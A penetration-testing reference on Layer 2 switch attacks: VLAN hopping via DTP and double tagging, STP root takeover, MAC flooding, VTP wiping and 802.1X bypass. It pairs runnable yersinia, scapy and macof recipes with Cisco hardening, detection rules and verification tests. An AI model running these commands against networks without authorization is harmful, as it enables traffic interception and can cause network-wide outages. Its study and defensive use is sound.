# VLAN and Layer 2 Attacks

Attacks against the switch fabric: VLAN hopping, DTP abuse, STP
manipulation, MAC flooding. These techniques let an attacker escape
their assigned VLAN or intercept traffic they should not see. The
defenses are all on the switch - most are disabled by default.

> [!CAUTION]
> Layer 2 attacks can bring down a production network. A misconfigured
> STP attack can create a loop and saturate the entire broadcast domain.
> Only run these against switches you own or have written authorization
> to test.

---

## 1. Overview

A VLAN is a logical segmentation of a physical switch. Hosts in
different VLANs cannot talk directly; traffic must go through a router
or Layer 3 switch. The segmentation is enforced by the switch, not by
the hosts.

The switch fabric relies on several protocols that have no
authentication:

- **DTP** (Dynamic Trunking Protocol) - negotiates trunk links between
  switches. A port in `dynamic auto` mode will become a trunk if the
  other side asks.
- **STP** (Spanning Tree Protocol) - prevents loops. The root bridge
  is elected by lowest priority/MAC. Any switch can claim to be root.
- **VTP** (VLAN Trunking Protocol) - propagates VLAN database changes
  between Cisco switches. A rogue VTP server can wipe or add VLANs.
- **CDP/LLDP** - discovery protocols that leak device model, IOS
  version, and management IP.

Each of these can be abused to escape a VLAN or disrupt the network.

---

## 2. Reconnaissance / Enumeration

### 2.1 Passive discovery

```bash
# Capture CDP/LLDP/DTP frames (requires root, same broadcast domain)
sudo tcpdump -i eth0 -nn -v -s 1500 -c 10 'ether[20:2] == 0x2000'

# Or use tcpdump for CDP specifically
sudo tcpdump -i eth0 -nn -v 'ether dst 01:00:0c:cc:cc:cc'
```

Expected output (CDP frame):

```text
Device-ID: SW-ACCESS-01
Platform: cisco WS-C2960-24TT-L
Address: 10.0.0.2
Port-ID: GigabitEthernet0/1
Native VLAN: 1
```

### 2.2 Active discovery with yersinia

```bash
sudo yersinia -I
# Press 'h' for help. Choose protocol (DTP, STP, CDP) from the menu.
# 'x' lists available attacks for the selected protocol.
```

### 2.3 DTP negotiation check

```bash
# Send a DTP frame and see if the switch replies as a trunk
sudo yersinia -G   # GTK GUI
# Or use scapy:
python3 -c "
from scapy.all import *
sendp(Ether(dst='01:00:0c:cc:cc:cc')/LLC()/SNAP()/DTP(), iface='eth0', count=5)
"
```

If the port becomes a trunk, you can see all VLANs on it.

---

## 3. Common Attack Vectors

### 3.1 VLAN hopping - switch spoofing

The attacker negotiates a trunk with the switch (via DTP) and then
tags frames with arbitrary VLAN IDs. Traffic for every VLAN crosses
the trunk, so the attacker sees everything.

**Precondition:** the access port is in `dynamic auto` or `dynamic
desirable` mode, and the attacker can send DTP frames.

### 3.2 VLAN hopping - double tagging

The attacker sends a frame with two 802.1Q tags: an outer tag matching
the attacker's native VLAN, and an inner tag for the target VLAN. The
first switch strips the outer tag and forwards to the second switch,
which reads the inner tag.

**Precondition:** the attacker is on the native VLAN of the trunk
port, and the target is on a different VLAN.

### 3.3 STP manipulation

The attacker sends BPDUs claiming to be the root bridge with a very
low priority. The real root loses the election; STP reconverges with
the attacker as root. All traffic now flows through the attacker.

**Impact:** full MITM on the entire Layer 2 domain. Dangerous - a
mistake can create a loop and DoS the network.

### 3.4 MAC flooding

Fill the switch CAM table with random source MACs. Once full, the
switch floods all frames to all ports (hub mode). The attacker sees
traffic from all hosts.

**Modern relevance:** port security usually blocks this. Still useful
against unmanaged switches and some older hardware.

### 3.5 VTP attack

Send a VTP advertisement with a higher revision number and a modified
VLAN database (or an empty one). Switches in the same VTP domain
overwrite their VLANs.

**Impact:** DoS (all VLANs removed) or traffic redirection (VLANs
renumbered).

### 3.6 802.1X bypass

If 802.1X is misconfigured, several bypasses exist:

- **MAB (MAC Authentication Bypass)** with a spoofed authorized MAC.
- **Hub between supplicant and authenticator** to piggyback on an
  authenticated session.
- **Rogue authenticator** to capture credentials from the supplicant.

---

## 4. Exploitation Recipes

### 4.1 Switch spoofing with yersinia (DTP)

```bash
sudo yersinia -I
# Press '1' to enable DTP attack
# Choose "enabling trunking"
# Press 'x' to launch
```

Expected result: the access port becomes a trunk, and `ip link` shows
the interface as trunk-capable. Now tag frames with arbitrary VLANs.

### 4.2 Double tagging with scapy

```python
from scapy.all import *
# Send a frame to VLAN 100 (target), tagged as native VLAN 1
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
      Dot1Q(vlan=1) / \
      Dot1Q(vlan=100) / \
      IP(dst="10.0.100.10") / \
      ICMP()
sendp(pkt, iface="eth0")
```

The outer tag (VLAN 1) is stripped by the first switch; the inner tag
(VLAN 100) reaches the target. Response traffic does not return, so
this is one-way (useful for blind attacks, not for interactive sessions).

### 4.3 STP root takeover with yersinia

```bash
sudo yersinia -I
# Press '2' for STP
# Choose "taking root role"
# Press 'x' to launch
```

Verify with Wireshark: BPDUs from your MAC should now be the root.

```bash
sudo tcpdump -i eth0 -nn -e 'stp'
```

Expected output:

```text
00:11:22:33:44:55 > 01:80:c2:00:00:00, 802.3, length 35: STP config
    Root Identifier: 4096/0/00:11:22:33:44:55
    Bridge Identifier: 4096/0/00:11:22:33:44:55
```

### 4.4 MAC flooding with macof

```bash
# Part of the dsniff suite
sudo macof -i eth0
```

Send hundreds of thousands of frames with random source MACs. The
switch CAM table fills; further traffic is flooded.

### 4.5 VTP attack with yersinia

```bash
sudo yersinia -I
# Press '3' for VTP
# Choose "deleting all VLANs" or "adding a new VLAN"
# Press 'x' to launch
```

**Extremely destructive.** Removes VLANs from all switches in the
same VTP domain. Requires a VTP password if one is configured (but
VTPv1/v2 passwords are weak and can be cracked offline).

---

## 5. Post-Exploitation

After a successful Layer 2 attack:

- **Sniff all VLANs** (if you have a trunk port): `tcpdump -i eth0.100`
  for VLAN 100, etc.
- **MITM all inter-VLAN traffic** (if you are the STP root).
- **Reach isolated hosts** (management interfaces, printers, IoT).
- **Poison ARP** in each VLAN you now see (see file 01).
- **Relay credentials** captured on the trunk (see file 06).

For a trunk port, create sub-interfaces for each VLAN:

```bash
sudo ip link add link eth0 name eth0.100 type vlan id 100
sudo ip addr add 10.0.100.50/24 dev eth0.100
sudo ip link set eth0.100 up
```

---

## 6. Risk Context (AppSec)

| Factor | Value |
|--------|-------|
| Typical severity | High (VLAN escape) to Critical (STP root) |
| Preconditions | Attacker has a physical or wireless port on the switch |
| Detectability | Medium - switch logs DTP/STP changes; without them, silent |
| Business impact | Full network visibility, lateral movement, DoS |

Layer 2 attacks are rarely the initial foothold (they require physical
or wireless access). They are a **lateral movement and segmentation
bypass** primitive.

---

## 7. Root Causes (AppSec)

- DTP enabled on access ports (default on many Cisco switches).
- Native VLAN 1 used for user traffic (default).
- STP without BPDU Guard, Root Guard, or Loop Guard.
- Port security not enabled, or maximum MAC count too high.
- VTP in server mode with a weak or no password.
- Management VLAN not isolated from user VLANs.
- 802.1X deployed but MAB allowed without profiling.

---

## 8. Preventive Controls (AppSec)

### 8.1 Disable DTP on access ports

```text
interface GigabitEthernet0/1
 switchport mode access
 switchport nonegotiate
```

`switchport mode access` alone is not enough - `nonegotiate` stops
DTP frames entirely.

### 8.2 Change the native VLAN

```text
interface GigabitEthernet0/1
 switchport trunk native vlan 999
!
vlan 999
 name NATIVE_UNUSED
 state active
```

Use a VLAN that carries no user traffic. This defeats double tagging.

### 8.3 BPDU Guard and Root Guard

```text
! Global (applies to all PortFast ports)
spanning-tree portfast bpduguard default

! Per interface (on trunk links toward other switches)
interface GigabitEthernet0/24
 spanning-tree guard root
```

BPDU Guard err-disables a port that receives BPDUs on a PortFast port.
Root Guard prevents a downstream switch from becoming root.

### 8.4 Port security

```text
interface GigabitEthernet0/1
 switchport port-security
 switchport port-security maximum 1
 switchport port-security violation shutdown
 switchport port-security mac-address sticky
```

Limits MAC addresses per port and shuts the port on violation.

### 8.5 VTP hardening

- Use VTP version 3 (supports primary server and password).
- Set VTP mode to `transparent` on all switches that do not need to
  propagate VLANs.
- Set a strong VTP password.

```text
vtp mode transparent
```

### 8.6 802.1X with MAB profiling

- Enable 802.1X on all access ports.
- If MAB is required, use a profiling solution (Cisco ISE, Aruba
  ClearPass) to restrict MAB to known device fingerprints.
- Use EAP-TLS (certificate-based) where possible; avoid PEAP-MSCHAPv2
  for domain devices.

---

## 9. Detection Controls (AppSec)

### 9.1 Switch logs

- DTP: a port changing to trunk mode without change control.
- STP: root bridge change, topology change notifications (TCN).
- Port security: violations logged as `PSECURE_VIOLATION`.
- VTP: revision number jumps.

### 9.2 Network monitoring

- Duplicate MAC address seen on multiple ports.
- Sudden broadcast storm (MAC flooding, STP loop).
- BPDUs from non-switch ports (BPDU Guard catches this).

### 9.3 Syslog examples

```text
%SPANTREE-2-ROOTGUARD_BLOCK: Root guard blocking port GigabitEthernet0/24
%PORT_SECURITY-2-PSECURE_VIOLATION: Security violation on port Gi0/1
%SWITCH_QOS_TB-5-TRUST_DEVICE_LOST: Trust device lost on Gi0/1
```

### 9.4 SIEM rules

- Alert on VTP revision number change outside a change window.
- Alert on new root bridge MAC.
- Alert on port transitioning to trunk without a change ticket.

---

## 10. Verification (AppSec)

Test the controls after deployment:

1. **DTP:** connect a device that sends DTP frames (yersinia). The port
   should not become a trunk.
2. **Native VLAN:** send a double-tagged frame. The second switch should
   drop it (native VLAN mismatch).
3. **BPDU Guard:** send BPDUs from a PC. The port should err-disable.
4. **Root Guard:** send BPDUs claiming a lower priority. The port
   should go into `root-inconsistent` state.
5. **Port security:** connect a mini-switch. The port should shut down
   after the second MAC.
6. **VTP:** send a VTP advertisement with a higher revision. If mode is
   transparent, no propagation.

---

## 11. OSCP Notes

Layer 2 attacks are **not** in the standard OSCP exam (no switch access
in the exam network). They are relevant for:

- Real internal engagements where you land on a corporate LAN.
- PEN-200 "Pivoting" and "Active Directory" modules (context).
- Wireless assessments (after association, you are on a Layer 2 segment).

For the exam report, discuss the **defensive controls**, not the tooling.
OSCP graders want to see that you understand the risk and the mitigation.

---

## 12. Production Notes

- **STP attacks are the most dangerous.** A mistake creates a loop
  and can bring down the entire broadcast domain. Test in a lab first.
- **VTP attacks are destructive and irreversible without a backup.**
  Always have a config backup before testing VTP.
- **MAC flooding** is loud (CPU spikes on the switch) and often
  rate-limited. It rarely works on modern hardware.
- **VLAN hopping via double tagging** is one-way. Do not expect
  an interactive shell from this technique alone.
- **Wireless:** if you associate to a corporate SSID, you are on a
  Layer 2 segment. The same attacks apply (DTP, STP, ARP), but the AP
  may isolate clients.
- **Cloud networks:** VLAN attacks do not apply. The hypervisor
  enforces isolation regardless of what the guest sends.

---

## 13. References

- IEEE 802.1Q - VLAN tagging
- IEEE 802.1D - Spanning Tree Protocol
- IEEE 802.1X - Port-based Network Access Control
- Cisco - "VLAN Security White Paper"
- [MITRE ATT&CK T1599 - Network Boundary Bridging](https://attack.mitre.org/techniques/T1599/)
- NIST SP 800-115 - Technical Guide to Information Security Testing
- yersinia manual (https://github.com/tomac/yersinia)
- dsniff suite (`macof`, `arpspoof`)